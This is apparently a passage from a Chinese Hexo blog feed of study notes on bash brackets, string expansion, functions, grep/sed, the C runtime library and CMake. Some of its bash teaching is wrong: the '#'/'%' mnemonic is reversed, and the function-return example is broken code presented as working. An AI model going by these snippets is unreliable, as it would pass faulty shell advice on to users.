-a ($c -eq $b) ]</code>会报错</li><li>注意两边的空格</li></ul><hr><h1 id="-3"><a href="#-3" class="headerlink" title="[[]]"></a>[[]]</h1><p>双括号表达式是<code>[]</code>的扩展，添加了正则表达式的支持。并且不同于<code>[]</code>的逻辑符号是<code>-a</code> <code>-o</code> <code>[[]]</code>允许使用 <code>&amp;&amp;</code> <code>||</code>。如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$a</span> != 1 &amp;&amp; <span class="hljs-variable">$a</span> != 2 ]]   <br></code></pre></td></tr></table></figure><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402180105560.png"></p><p><a href="https://taoshu.in/unix/test-bracket.html#fn1">https://taoshu.in/unix/test-bracket.html#fn1</a></p><p>上面这篇文章写了shell中的<code>[</code>、<code>[[</code>之间关系</p><hr><h1 id="-4"><a href="#-4" class="headerlink" title="{}"></a>{}</h1><p>大括号有三个作用：</p><ul><li>扩展，对于{}内的以逗号分割的文件列表进行拓展。或者对大括号中以点点（..）分割的顺序文件列表起拓展作用。</li><li>包含多个命令在本shell中执行，<code>&#123;cd;ls -al;cd -;&#125;</code>和<code>()</code>不同的是最后一个命令后必须有<code>;</code>，而<code>()</code>不做要求。并且<strong>第一条命令和左括号之间必须用空格隔开。</strong></li><li>函数块</li></ul><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ls &#123;ex1,ex2&#125;.sh    </span><br>ex1.sh  ex2.sh    <br><span class="hljs-comment"># ls &#123;ex&#123;1..3&#125;,ex4&#125;.sh    </span><br>ex1.sh  ex2.sh  ex3.sh  ex4.sh    <br><span class="hljs-comment"># ls &#123;ex[1-3],ex4&#125;.sh    </span><br>ex1.sh  ex2.sh  ex3.sh  ex4.sh    <br></code></pre></td></tr></table></figure><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span> name &#123;<br><br>&#125;<br><span class="hljs-comment">#或</span><br><span class="hljs-function"><span class="hljs-title">name</span></span>() &#123;<br><br>&#125;<br></code></pre></td></tr></table></figure><hr><h1 id="对于字符串的操作"><a href="#对于字符串的操作" class="headerlink" title="对于字符串的操作"></a>对于字符串的操作</h1><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312101740713.png"></p><p><strong>记忆方法：</strong><br><code>#</code>位于<code>$</code>的右边，所以<code>#</code>是从右边开始；<code>%</code>在<code>$</code>左边，所以是从左边开始 </p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># var=/home/centos  </span><br><span class="hljs-comment"># echo $var  </span><br>/home/centos  <br><span class="hljs-comment"># echo $&#123;var:5&#125;  </span><br>/centos  <br><span class="hljs-comment"># echo $&#123;var: -6&#125;  </span><br>centos  <br><span class="hljs-comment"># echo $&#123;var:(-6)&#125;  </span><br>centos  <br><span class="hljs-comment"># echo $&#123;var:1:4&#125;  </span><br>home  <br><span class="hljs-comment"># echo $&#123;var/o/h&#125;  </span><br>/hhme/centos  <br><span class="hljs-comment"># echo $&#123;var//o/h&#125;  </span><br>/hhme/cenths  <br><br><span class="hljs-comment"># var=testcase    </span><br><span class="hljs-comment"># echo $var    </span><br>testcase    <br><span class="hljs-comment"># echo $&#123;var%s*e&#125;   </span><br>testca    <br><span class="hljs-comment"># echo $var    </span><br>testcase   <br><span class="hljs-comment"># echo $&#123;var%%s*e&#125;   </span><br>te  <br><span class="hljs-comment"># echo $&#123;var#?e&#125;    </span><br>stcase  <br><span class="hljs-comment"># echo $&#123;var##?e&#125;    </span><br>stcase  <br><span class="hljs-comment"># echo $&#123;var##*e&#125;    </span><br>  <br><span class="hljs-comment"># echo $&#123;var##*s&#125;    </span><br>e    <br><span class="hljs-comment"># echo $&#123;var##test&#125;    </span><br><span class="hljs-keyword">case</span>    <br><br><span class="hljs-comment">#发现输出的内容是var去掉pattern的那部分字符串的值</span><br></code></pre></td></tr></table></figure><hr><h1 id="几种特殊的替换结构"><a href="#几种特殊的替换结构" class="headerlink" title="几种特殊的替换结构"></a>几种特殊的替换结构</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$&#123;var:-string&#125;</span> <br><span class="hljs-variable">$&#123;var:+string&#125;</span> <br><span class="hljs-variable">$&#123;var:=string&#125;</span><br><span class="hljs-variable">$&#123;var:?string&#125;</span><br></code></pre></td></tr></table></figure><ol><li><p><code>$&#123;var:-string&#125;</code>和<code>$&#123;var:=string&#125;</code>:若变量var为空，则用在命令行中用string来替换<code>$&#123;var:-string&#125;</code>，否则变量var不为空时，则用变量var的值来替换<code>$&#123;var:-string&#125;</code>；对于<code>$&#123;var:=string&#125;</code>的替换规则和$<code>&#123;var:-string&#125;</code>是一样的，所不同之处是<code>$&#123;var:=string&#125;</code>若var为空时，用string替换<code>$&#123;var:=string&#125;</code>的同时，把string赋给变量var： <code>$&#123;var:=string&#125;</code>很常用的一种用法是，判断某个变量是否赋值，没有的话则给它赋上一个默认值。</p></li><li><p><code>$&#123;var:+string&#125;</code>的替换规则和上面的相反，即只有当var不是空的时候才替换成string，若var为空时则不替换或者说是替换成变量 var的值，即空值。(因为变量var此时为空，所以这两种说法是等价的)</p></li><li><p><code>&#123;var:?string&#125;</code>替换规则为：若变量var不为空，则用变量var的值来替换$<code>&#123;var:?string&#125;</code>；若变量var为空，则把string输出到标准错误中，并从脚本中退出。我们可利用此特性来检查是否设置了变量的值。</p></li></ol><p>补充扩展：在上面这五种替换结构中string不一定是常值的，可用另外一个变量的值或是一种命令的输出。</p><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>只有<code>[]</code>中不可以直接使用数学比较符号如<code>&lt; &gt;</code>等等，要使用也是要转义的<code>\&gt;</code>，但是无法转移<code>&gt;=</code> <code>&lt;=</code>。所以最好还是在<code>[]</code>中使用字母。</li></ol><hr><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.runoob.com/w3cnote/linux-shell-brackets-features.html">https://www.runoob.com/w3cnote/linux-shell-brackets-features.html</a></p><p><a href="https://www.cnblogs.com/hkui/p/6423918.html">https://www.cnblogs.com/hkui/p/6423918.html</a></p><p><a href="https://math.ecnu.edu.cn/~jypan/Teaching/Linux/Linux08/lect14_Review.pdf">https://math.ecnu.edu.cn/~jypan/Teaching/Linux/Linux08/lect14_Review.pdf</a></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>bash</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bash编程中的函数</title>
    <link href="/2023/12/10/bash%E7%BC%96%E7%A8%8B%E4%B8%AD%E7%9A%84%E5%87%BD%E6%95%B0/"/>
    <url>/2023/12/10/bash%E7%BC%96%E7%A8%8B%E4%B8%AD%E7%9A%84%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<p>总结bash编程中的函数用法</p><span id="more"></span><h1 id="语法格式"><a href="#语法格式" class="headerlink" title="语法格式"></a>语法格式</h1><p>bash中有两中定义函数的方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1</span><br><span class="hljs-keyword">function</span> name &#123;<br>    commands<br>&#125;<br><br><span class="hljs-comment"># 2</span><br><span class="hljs-function"><span class="hljs-title">name</span></span> () &#123;<br>    commands<br>&#125;<br><span class="hljs-comment">#注意第二种方法()中不可以有东西</span><br></code></pre></td></tr></table></figure><p><strong>注意，<code>name</code> 和<code>&#123;</code> 之间必须有一个空格，否则报错</strong></p><hr><h1 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h1><p>在bash中，默认情况下的函数返回值是最后一个命令执行后的返回值，使用<code>$?</code>来表示函数的返回值。所以，我们无法知道其他命令是否成功执行。有两种方法可以解决这个问题</p><h2 id="return语句"><a href="#return语句" class="headerlink" title="return语句"></a>return语句</h2><p>这个语句可以指定一个返回值，使用这个语句必须注意：</p><ul><li>实际上这个语句是将设置的返回值存放至<code>$?</code>变量</li><li>返回值的范围 <strong>0-255</strong> 之间，如果大于或小于这个范围就会返回一个不一致的值</li><li>如果在用<code>$?</code>变量提取函数返回值之前执行了其他命令，那么函数的返回值会丢失。记住，<code>$?</code>变量保存的是最后执行的那个命令的退出状态码。</li></ul><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><ul><li>使用这个方法只可以返回整数，无法返回浮点数、字符、字符串。</li></ul><h2 id="使用变量接受返回值"><a href="#使用变量接受返回值" class="headerlink" title="使用变量接受返回值"></a>使用变量接受返回值</h2><p>由于直接使用<code>$?</code>有上述的缺点，所以可以不使用<code>$?</code>而直接使用一个变量接受返回值。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span> add&#123;<br>    n=$[ <span class="hljs-variable">$1</span> /* <span class="hljs-variable">$2</span> ]<br>    <span class="hljs-built_in">return</span> n<br>&#125;<br><br>re=$(add)<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;return is <span class="hljs-variable">$re</span>&quot;</span><br></code></pre></td></tr></table></figure><p>上述代码注意：</p><ul><li>乘法在bash中必须被专一</li><li><code>$()</code>相当于开一个新shell执行<code>add</code>函数</li></ul><p>这种方法可以返回浮点数、字符、字符串</p><hr><h1 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h1><p>如何向函数传递参数，在<code>bash</code>中使用特殊的变量：<code>$+数字</code>，注意<code>$0</code>表示的是函数名，<code>$1</code>表示函数的第一个参数。</p><h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><p>bash中有全局变量和局部变量，默认就是全局变量，要定义局部变量使用<code>local</code></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>bash</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>正则表达式学习</title>
    <link href="/2023/12/09/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0/"/>
    <url>/2023/12/09/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>正则表达式学习笔记</p><span id="more"></span><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>正则表达式是普通字符和特殊字符的合集。其具体的载体命令有：<code>awk</code> <code>sed</code> <code>grep</code>。系统自带的所有大的文本过滤工具在某种模式下都支持正则表达式的使用，并且还包括一些扩展的元字符集。</p><h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><h2 id="基本组成"><a href="#基本组成" class="headerlink" title="基本组成"></a>基本组成</h2><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312091420714.png"></p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312091530186.png"></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312091529899.png"></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312091529612.png"></p><h1 id="sed命令"><a href="#sed命令" class="headerlink" title="sed命令"></a>sed命令</h1><p>不会改变原来的字符串。</p><h1 id="grep命令"><a href="#grep命令" class="headerlink" title="grep命令"></a>grep命令</h1><h2 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep [选项] pattern file1 file2 ...<br><br>pattern:可以是正则表达式（用单引号括起来）、或字符串（加双引号）、或一个单词。<br><br>注意的是：**文件必须要放在最后面**<br></code></pre></td></tr></table></figure><h2 id="常用的选项"><a href="#常用的选项" class="headerlink" title="常用的选项"></a>常用的选项</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs txt">-l:查询多个文件时，只输出包含匹配模式的文件的文件名<br>-r:递归读取文件夹下的文件<br>-i:不区分大小写<br>-n:显示行号<br>-s:不显示错误信息<br>-f:指定一个需要搜索的文件<br>-d:如果传输给grep命令的文件中有目录话，需要使用这个选项这个选项还对应了三个操作；<br>    grep -d [ACTION] directory_name<br>        其中 ACTION 可以是<br>        read：把目录文件当作普通文件来读取<br>        skip：目录将被忽略而跳过<br>        recurse：递归的方式读取目录下的每一个文件，可以用选项 &quot;-r&quot; 代替 &quot;-d recurse&quot;<br></code></pre></td></tr></table></figure><h2 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h2><h3 id="关于某个字符连续出现次数的匹配"><a href="#关于某个字符连续出现次数的匹配" class="headerlink" title="关于某个字符连续出现次数的匹配"></a>关于某个字符连续出现次数的匹配</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep <span class="hljs-string">&#x27;ol\&#123;2\&#125;&#x27;</span> hello <span class="hljs-comment">#ol出现2ci的满足要求</span><br>grep <span class="hljs-string">&#x27;ol\&#123;2,\&#125;&#x27;</span> hellp <span class="hljs-comment">#ol至少出现两次的满足要求</span><br>gerp <span class="hljs-string">&#x27;ol\&#123;2,5\&#125;&#x27;</span> hellp <span class="hljs-comment">#ol出现2-5次之间的次数都满足要求</span><br></code></pre></td></tr></table></figure><h3 id="grep搜索文件夹"><a href="#grep搜索文件夹" class="headerlink" title="grep搜索文件夹"></a>grep搜索文件夹</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep -rl  <span class="hljs-string">&quot;nihao&quot;</span> doc/<br></code></pre></td></tr></table></figure><h3 id="其他例子"><a href="#其他例子" class="headerlink" title="其他例子"></a>其他例子</h3><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312091754445.png"></p><hr><h1 id="sed命令-1"><a href="#sed命令-1" class="headerlink" title="sed命令"></a>sed命令</h1><h2 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h2><p>sed命令是一个流处理命令，其不会改变文本的文件内容。</p><h3 id="sed的工作原理"><a href="#sed的工作原理" class="headerlink" title="sed的工作原理"></a>sed的工作原理</h3><p>sed 逐行处理文件（或输入），并将输出结果发送到屏幕。即：sed 从输入（可以是文件或其它标准输入）中读取一行，将之拷贝到一个编辑缓冲区，按指定的 sed 编辑命令进行处理，编辑完后将其发送到屏幕上，然后把这行从编辑缓冲区中删除，读取下面一行。重复此过程直到全部处理结束。</p><h2 id="格式-1"><a href="#格式-1" class="headerlink" title="格式"></a>格式</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sed [-n][-e][-f] <span class="hljs-string">&#x27;sed_cmd&#x27;</span> input_file<br><br>其中sed_cmd是sed命令自己提供的命令，当使用`-f`时，sed_cmd可以换成sed_script_file<br></code></pre></td></tr></table></figure><h2 id="常用选项"><a href="#常用选项" class="headerlink" title="常用选项"></a>常用选项</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">-n:缺省的时候，sed会自动从缓冲区读出一行内容输出，如果使用这个选项，则会禁止<br>-e:允许使用多条sed命令，sed_cmd<br>-f:指定sed脚本，sed_script_file<br></code></pre></td></tr></table></figure><h2 id="常用的sed命令"><a href="#常用的sed命令" class="headerlink" title="常用的sed命令"></a>常用的sed命令</h2><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312091813295.png"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://math.ecnu.edu.cn/~jypan/Teaching/Linux/Linux08/lect14_Review.pdf">https://math.ecnu.edu.cn/~jypan/Teaching/Linux/Linux08/lect14_Review.pdf</a></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>运行时库(CRT)</title>
    <link href="/2023/12/06/%E8%BF%90%E8%A1%8C%E6%97%B6%E5%BA%93-CRT/"/>
    <url>/2023/12/06/%E8%BF%90%E8%A1%8C%E6%97%B6%E5%BA%93-CRT/</url>
    
    <content type="html"><![CDATA[<p>介绍运行时库</p><span id="more"></span><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>今天在查找资料的时候看到了一个之前没有看到过的概念——运行时库（CRT），于是查找了一些相关资料。现在进行总结。</p><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>运行时库是一个C语言中的概念，我们知道在C语言编程中需要包含一些头文件才可以使用相关的函数。但是头文件只是提供了一个接口，而实现是提供在具体的<code>.c</code>源文件中，而在Linux中又会将这些源文件制作成静态或是动态库文件。而这些库文件实际上就是所谓的运行时库。</p><h1 id="和标准库"><a href="#和标准库" class="headerlink" title="和标准库"></a>和标准库</h1><p>标准库包括了头文件和具体的实现源文件，所以标准库实际上是包括了运行时库的。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.cnblogs.com/LiaoQian1996/p/13411639.html">https://www.cnblogs.com/LiaoQian1996/p/13411639.html</a></p><p><a href="https://markrepo.github.io/kernel/2018/08/26/miniCRT/">https://markrepo.github.io/kernel/2018/08/26/miniCRT/</a></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cmake总结</title>
    <link href="/2023/12/06/Cmake%E6%80%BB%E7%BB%93/"/>
    <url>/2023/12/06/Cmake%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>总结Cmake的使用</p><span id="more"></span><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>之前我学习了，Linux中autotools工具链的使用，但是在学习的过程中我发现还有比autotools更加方便，更加好用的制作Makefile文件的工具——Cmake</p><h1 id="Autotools和Cmake的对比"><a href="#Autotools和Cmake的对比" class="headerlink" title="Autotools和Cmake的对比"></a>Autotools和Cmake的对比</h1><p>首先我们已经知道了Autotools工具链的使用非常繁琐：<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312061558984.png"></p><p>而Cmake的使用只需要编写<code>Cmake.txt</code>文件，将自己的需求告诉Cmake就可以了。其实Cmake就是一种语言，我们通过Cmake的语法编写<code>Cmake.txt</code>文件内容。</p><h1 id="安装Cmake"><a href="#安装Cmake" class="headerlink" title="安装Cmake"></a>安装Cmake</h1><div class="note note-warning">            <p>注意：由于Cmake是一个版本控制工具，所以我们使用的Cmake最好比我们使用的编译器的版本的发行时间要晚，所以我们尽量使用新版本的Cmake。</p>          </div><h1 id="常用的函数以及操作"><a href="#常用的函数以及操作" class="headerlink" title="常用的函数以及操作"></a>常用的函数以及操作</h1><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs Cmake"><span class="hljs-keyword">cmake_minimum_required</span>(VERSION <span class="hljs-number">3.10</span>)<br><span class="hljs-comment"># 指定运行此配置文件所需的 CMake 的最低版本。</span><br><br><span class="hljs-keyword">project</span>(Hello VERSION <span class="hljs-number">1.0</span>)<br><span class="hljs-comment"># 设置项目的属性，包括（名称、版本等待）。同时会自动生成PROJECT_NAME 变量，使用 $&#123;PROJECT_NAME&#125; 即可访问到 hello_cmake。</span><br><br><span class="hljs-keyword">add_executable</span>(Hello hello.c)<br><span class="hljs-comment"># 第一个参数是可执行文件名，第二个参数是要编译的源文件列表。这里将hello.c文件编译成hello可执行文件，在有源函数的文件夹中的CMakeTlists中使用。</span><br><br><span class="hljs-keyword">install</span>(TARGETS Hello)<br><span class="hljs-comment"># 指定安装的目标</span><br><br><span class="hljs-keyword">aux_source_directory</span>(. DIR_SRCS)<br><span class="hljs-comment"># 查询当前目录下的所有源文件，将其存储在DIR_SRCE变量下</span><br><br><span class="hljs-keyword">ADD_LIBRARY</span>(libname [SHARED|STATIC|MODULE]<br> [EXCLUDE_FROM_ALL]<br> source1 source2 ... sourceN)<br><span class="hljs-comment"># add_library：用于从某些源文件创建一个库，默认生成在构建文件夹。第一个参数为库名（不需要 lib 前缀，会自动添加），第二个参数用于指定 SHARED（动态库），STATIC（静态库）（如果不写，则通过全局BUILD_SHARED_LIBS 的 FALSE 或 TRUE 来指定）。第三个参数即为源文件列表。</span><br><br><span class="hljs-comment">#类型有三种:</span><br><span class="hljs-comment">#SHARED，动态库</span><br><span class="hljs-comment">#STATIC，静态库</span><br><span class="hljs-comment">#MODULE，在使用 dyld 的系统有效，如果不支持 dyld，则被当作 SHARED 对待。</span><br><br><span class="hljs-comment"># EXCLUDE_FROM_ALL 参数的意思是这个库不会被默认构建，除非有其他的组件依赖或者手工构建。</span><br><br><span class="hljs-keyword">target_link_libraries</span>(Demo MathFunctions)<br><span class="hljs-comment"># target_link_libraries：该命令用于指明可执行文件 Demo 需要链接 MathFunctions 库。第一个参数为可执行文件名，第二个参数为访问权限（PUBLIC、PRIVATE、INTERFACE，默认为 PUBLIC），第三个参数为库名（这两个参数可以为多个）。</span><br><br><span class="hljs-keyword">MESSAGE</span>([SEND_ERROR | STATUS | FATAL_ERROR] <span class="hljs-string">&quot;message to display&quot;</span><br>...)<br><span class="hljs-comment"># 这个指令用于向终端输出用户定义的信息，包含了三种类型:</span><br><span class="hljs-comment"># SEND_ERROR，产生错误，生成过程被跳过。</span><br><span class="hljs-comment"># SATUS，输出前缀为—的信息。</span><br><span class="hljs-comment"># FATAL_ERROR，立即终止所有 cmake 过程.</span><br><br><span class="hljs-keyword">SET</span>(VAR [VALUE] [CACHE TYPE DOCSTRING [FORCE]])<br><span class="hljs-comment"># 现阶段，你只需要了解 SET 指令可以用来显式的定义变量即可。</span><br><span class="hljs-comment"># 比如我们用到的是 SET(SRC_LIST main.c)，如果有多个源文件，也可以定义成：</span><br><span class="hljs-comment"># SET(SRC_LIST main.c t1.c t2.c)。</span><br><br><br><span class="hljs-keyword">ADD_SUBDIRECTORY</span> 指令<br><span class="hljs-keyword">ADD_SUBDIRECTORY</span>(source_dir [binary_dir] [EXCLUDE_FROM_ALL])<br><span class="hljs-comment"># 这个指令用于向当前工程添加存放源文件的子目录，并可以指定中间二进制和目标二进制存放的位置。EXCLUDE_FROM_ALL 参数的含义是将这个目录从编译过程中排除，比如，工程的 example，可能就需要工程构建完成后，再进入 example 目录单独进行构建(当然，你也可以通过定义依赖来解决此类问题)。在主CMakeLists中使用。</span><br><br><br>通过 <span class="hljs-keyword">SET</span> 指令重新定义 EXECUTABLE_OUTPUT_PATH 和 LIBRARY_OUTPUT_PATH 变量<br>来指定最终的目标二进制的位置(指最终生成的 hello 或者最终的共享库，不包含编译生成<br>的中间文件)<br><br><span class="hljs-keyword">SET</span>(EXECUTABLE_OUTPUT_PATH <span class="hljs-variable">$&#123;PROJECT_BINARY_DIR&#125;</span>/bin)<br><br><span class="hljs-keyword">SET</span>(LIBRARY_OUTPUT_PATH <span class="hljs-variable">$&#123;PROJECT_BINARY_DIR&#125;</span>/lib)<br><br>&lt;projectname&gt;_BINARY_DIR 和 PROJECT_BINARY_DIR 变量，他们指的编译发生的当前目录，如果是内部编译，就相当于 PROJECT_SOURCE_DIR 也就是<br>工程代码所在目录，如果是外部编译，指的是外部编译所在目录，也就是本例中的build目录。<br><br><span class="hljs-comment"># INSTALL函数，其中大写字母都是固定的，我们只需要更改小写字母的。</span><br><br><span class="hljs-comment"># 安装目标文件</span><br><span class="hljs-keyword">INSTALL</span>(TARGETS myrun mylib mystaticlib<br>RUNTIME DESTINATION bin<br>LIBRARY DESTINATION lib<br>ARCHIVE DESTINATION libstatic<br>)<br>上面的例子会将：<br>可执行二进制 myrun 安装到<span class="hljs-variable">$&#123;CMAKE_INSTALL_PREFIX&#125;</span>/bin 目录<br>动态库 libmylib 安装到<span class="hljs-variable">$&#123;CMAKE_INSTALL_PREFIX&#125;</span>/lib 目录<br>静态库 libmystaticlib 安装到<span class="hljs-variable">$&#123;CMAKE_INSTALL_PREFIX&#125;</span>/libstatic 目录<br><br><span class="hljs-comment"># 安装普通文件</span><br><span class="hljs-keyword">INSTALL</span>(FILES files... DESTINATION &lt;dir&gt;<br> [PERMISSIONS permissions...]  <span class="hljs-comment"># 权限</span><br> [CONFIGURATIONS [Debug|Release|...]]<br> [COMPONENT &lt;component&gt;]<br> [RENAME &lt;name&gt;] [OPTIONAL])<br><span class="hljs-comment"># 可用于安装一般文件，并可以指定访问权限，文件名是此指令所在路径下的相对路径。如果默认不定义权限 